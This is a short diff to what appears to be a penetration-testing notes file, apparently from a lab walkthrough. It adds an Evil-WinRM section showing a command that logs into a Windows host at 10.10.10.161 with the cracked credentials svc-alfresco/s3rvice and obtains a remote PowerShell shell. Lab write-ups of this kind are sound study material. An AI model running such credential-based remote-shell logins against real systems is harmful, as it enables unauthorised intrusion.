@@ -176,6 +176,17 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 
 ```
+
+## Evil-WinRM
+```markdown
+root@test:~/tools/Windows/evil-winrm# ruby evil-winrm.rb -u svc-alfresco -p s3rvice -i 10.10.10.161
+
+Evil-WinRM shell v2.0
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
+```
 ## Resources:
 
 https://securityonline.info/aclpwn/
